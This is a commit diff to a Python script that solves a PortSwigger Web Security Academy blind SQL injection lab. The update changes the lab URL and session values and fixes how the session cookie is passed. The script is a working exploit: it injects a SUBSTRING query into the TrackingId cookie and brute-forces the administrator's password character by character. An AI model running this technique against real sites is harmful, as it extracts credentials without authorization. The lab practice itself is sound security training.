0aa172bbe9ad9a5fc7d90280752c85b028b20dcc
Kacper Śniadek <67651085+cialoo@users.noreply.github.com>
2026-06-28 16:08:29 +0200

    Update portswigger-blind_sqli_oracle.py

--- portswigger-blind_sqli_oracle.py
+++ portswigger-blind_sqli_oracle.py
@@ -1,8 +1,8 @@
 import requests
 
-url = 'https://0a71005903179da880ef58290024002e.web-security-academy.net/filter?category=Gifts'
-trackingId = 'WRZcL3blKj8g33lD'
-session = 'nL2y3jQS7RGGszFBzSetHZfPfGPrOgOq'
+url = 'https://0a7300f304e45a338033a3b500bf0052.web-security-academy.net/filter?category=Gifts'
+trackingId = 'A3lqhSuKIR2ODc27'
+session = '3INirWqG8BuIQcO8CSClw7Xt9bq0Fn76'
 
 alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
             "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
@@ -15,7 +15,7 @@ while len(password) < password_length:
     position = len(password) + 1
     for alp in alphabet: 
         payload = f"{trackingId}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{alp}"
-        request = requests.get(url, cookies = {"TrackingId": payload, "session": "{session}"} )
+        request = requests.get(url, cookies = {"TrackingId": payload, "session": session} )
         if "Welcome back" in request.text:
             password = password + alp
             print(alp)
